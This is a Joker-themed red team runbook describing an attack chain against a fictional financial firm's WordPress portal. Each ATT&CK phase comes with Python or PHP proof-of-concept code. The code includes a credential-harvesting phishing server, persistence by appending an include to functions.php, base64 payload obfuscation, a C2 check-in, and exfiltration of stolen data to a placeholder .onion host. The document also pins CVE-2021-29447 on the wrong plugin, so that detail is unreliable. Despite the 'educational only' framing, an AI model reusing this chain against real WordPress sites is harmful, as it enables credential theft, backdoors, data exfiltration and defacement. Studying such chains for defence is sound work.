# Joker's MadCap WordPress Heist: An ATT&CK Chain Plot

This Red Team runbook unleashes *MadCap*, a custom virus exploiting a WordPress vulnerability to plunder FinCorp’s investor portal (hosted on WordPress). Each phase includes a Proof of Concept (PoC) in Python or PHP, showcasing chaotic creativity while staying sandbox-safe. No real systems are harmed—just a theatrical display of digital anarchy targeting a hypothetical WP Super Cache RCE flaw.

## 1. Reconnaissance (T1598: Phishing for Information)
**Objective**: Gather intel on FinCorp’s WordPress setup.  
**Execution**: Send spear-phishing emails posing as WordPress plugin support, tricking admins into revealing plugin versions or credentials. *“Urgent: WP Super Cache Security Patch!”* Clicks feed *MadCap*’s data collection.  
**PoC**: Simulate a phishing server capturing input.

```python
# PoC: MadCap Phishing Harvester
import http.server
import socketserver
import urllib.parse

PORT = 8083

class MadCapPhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)
        wp_config = params.get('wp_config', [''])[0]
        with open('wp_creds.txt', 'a') as f:
            f.write(f"WordPress Config: {wp_config}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"WordPress update complete!")
        
with socketserver.TCPServer(("", PORT), MadCapPhishHandler) as httpd:
    print(f"MadCap phishing server on port {PORT}")
    httpd.serve_forever()
```

**Notes**: Simulates plugin config harvesting. Real attacks would spoof WordPress domains.

## 2. Initial Access (T1199: Trusted Relationship)
**Objective**: Gain entry via compromised WordPress credentials.  
**Execution**: Use stolen admin creds to log into FinCorp’s WordPress dashboard, pivoting to server access.  
**PoC**: Mock a WordPress login.

```python
# PoC: WordPress Admin Login
import requests

def wp_login(username, password):
    url = "http://mock-wp-portal.com/wp-login.php"  # Simulated
    payload = {'log': username, 'pwd': password}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("WordPress access granted. Session: mock_session_101")
    else:
        print("Access denied.")
    return response.status_code

wp_login("wp_admin", "mock_pass_456")
```

**Notes**: Simulates dashboard access. Real attacks would leverage stolen creds for admin panel entry.

## 3. Execution (T1059: Command and Scripting Interpreter)
**Objective**: Deploy *MadCap* via WP Super Cache RCE.  
**Execution**: Exploit a hypothetical WP Super Cache flaw to inject a PHP shell (*MadCap.php*), executing server-side commands.  
**PoC**: Simulate RCE with a PHP script.

```php
<?php
// PoC: MadCap PHP Shell
$log_file = "wp_system_info.txt";
file_put_contents($log_file, php_uname());
echo "MadCap executed. System info logged to $log_file";
?>
```

**Notes**: Mimics RCE via a vulnerable plugin. Real attacks would upload malicious PHP files.

## 4. Persistence (T1547: Boot or Logon Autostart Execution)
**Objective**: Ensure *MadCap* persists on the server.  
**Execution**: Modify a WordPress theme file (e.g., `functions.php`) to reload *MadCap.php* on every page load.  
**PoC**: Simulate theme file modification.

```php
<?php
// PoC: Theme Persistence
$theme_file = "functions.php";
$madcap_code = "<?php include 'MadCap.php'; ?>";
file_put_contents($theme_file, $madcap_code, FILE_APPEND);
echo "Persistence established in $theme_file";
?>
```

**Notes**: Mock theme modification. Real attacks would hide in WordPress core files.

## 5. Privilege Escalation (T1068: Exploitation for Privilege Escalation)
**Objective**: Escalate to server-level access via WP Super Cache flaw.  
**Execution**: Exploit the RCE to gain root access on the server hosting FinCorp’s WordPress site.  
**PoC**: Simulate privilege escalation.

```python
# PoC: WordPress Server Escalation
def exploit_wp_supercache():
    print("Exploiting WP Super Cache RCE...")
    print("Server access granted: root_user")
    return True

if exploit_wp_supercache():
    print("Now running as server root!")
else:
    print("Escalation failed.")
```

**Notes**: Hypothetical RCE exploit (inspired by plugin vulns like CVE-2021-29447). Real attacks would target server misconfigs.

## 6. Defense Evasion (T1027: Obfuscated Files or Information)
**Objective**: Evade WordPress security plugins (e.g., Wordfence).  
**Execution**: Obfuscate *MadCap.php* to bypass file scans.  
**PoC**: Encode a PHP payload.

```python
# PoC: Obfuscation for WordPress
import base64

payload = "<?php echo 'MadCap running!'; ?>"
encoded = base64.b64encode(payload.encode()).decode()
print(f"Obfuscated payload: {encoded}")
decoded = base64.b64decode(encoded).decode()
with open("madcap_obfuscated.php", "w") as f:
    f.write(decoded)
print("Obfuscated MadCap written to madcap_obfuscated.php")
```

**Notes**: Simulates bypassing Wordfence. Real attacks would use hex encoding or eval().

## 7. Credential Access (T1003: OS Credential Dumping)
**Objective**: Steal WordPress database credentials.  
**Execution**: Extract creds from `wp-config.php`.  
**PoC**: Simulate credential extraction.

```python
# PoC: WordPress Config Dumping
def dump_wp_config():
    mock_config = {"DB_USER": "wp_user", "DB_PASSWORD": "hash:8c7gee6e8dd998g94gb660gdcb15hi22"}
    with open("wp_config_creds.txt", "w") as f:
        for key, value in mock_config.items():
            f.write(f"{key}: {value}\n")
    print("Credentials dumped to wp_config_creds.txt")

dump_wp_config()
```

**Notes**: Mimics `wp-config.php` extraction. Real attacks would access the database.

## 8. Collection (T1560: Archive Collected Data)
**Objective**: Gather blockchain keys from the WordPress database.  
**Execution**: Archive keys into an encrypted zip, evading WordPress DLP plugins.  
**PoC**: Create a mock zip.

```python
# PoC: Data Archiving
import zipfile

with zipfile.ZipFile("wp_stolen_data.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("blockchain_keys.txt", "mock_key_9012345678")
print("Data archived to wp_stolen_data.zip")
```

**Notes**: Simulates data collection. Real attacks would query the WordPress database.

## 9. Command and Control (T1105: Ingress Tool Transfer)
**Objective**: Establish a C2 channel bypassing WordPress security.  
**Execution**: Use a Tor-based C2 server masked as a WordPress comment post.  
**PoC**: Mock C2 communication.

```python
# PoC: C2 Communication
import requests

def c2_checkin():
    c2_url = "http://mock-c2.onion/wp_comment"  # Simulated
    data = {"id": "MadCapAgent", "status": "Active"}
    response = requests.post(c2_url, json=data)
    print("C2 check-in: ", response.text if response.status_code == 200 else "Failed")

c2_checkin()
```

**Notes**: Simulates C2 via WordPress endpoints. Real attacks would use Tor.

## 10. Exfiltration (T1041: Exfiltration Over C2 Channel)
**Objective**: Exfiltrate blockchain keys.  
**Execution**: Send data over the C2 channel, evading WordPress security plugins.  
**PoC**: Simulate exfiltration.

```python
# PoC: Data Exfiltration
def exfiltrate_data():
    with open("wp_stolen_data.zip", "rb") as f:
        data = f.read()
    mock_c2_url = "http://mock-c2.onion/wp_upload"
    response = requests.post(mock_c2_url, data=data)
    print("Data exfiltrated!" if response.status_code == 200 else "Exfil failed.")

exfiltrate_data()
```

**Notes**: Simulates exfiltration. Real attacks would use encrypted channels.

## 11. Impact (T1490: Inhibit System Recovery)
**Objective**: Cripple FinCorp’s WordPress portal with *MadCap*’s finale.  
**Execution**: Deploy a mock wiper, defacing the site with a calling card.  
**PoC**: Simulate site defacement.

```python
# PoC: MadCap Wiper
def wiper():
    with open("wp_index.php", "w") as f:
        f.write("")  # Simulate wiping
    with open("wp_card.txt", "w") as f:
        f.write("😈 MadCap says: WordPress is my playground! - The Joker")
    print("Site defaced. Calling card left.")

wiper()
```

## Runbook Notes
- **Execution Environment**: Sandbox-safe PoCs simulate *MadCap*’s behavior without harm.
- **Red Team Workflow**: Execute sequentially, adapting to WordPress security responses (e.g., Wordfence). Monitor for detection.
- **Cleanup**: Remove files (`wp_creds.txt`, `wp_index.php`, etc.) post-test.
- **Ethical Constraints**: No real systems or credentials harmed. PoCs are educational only.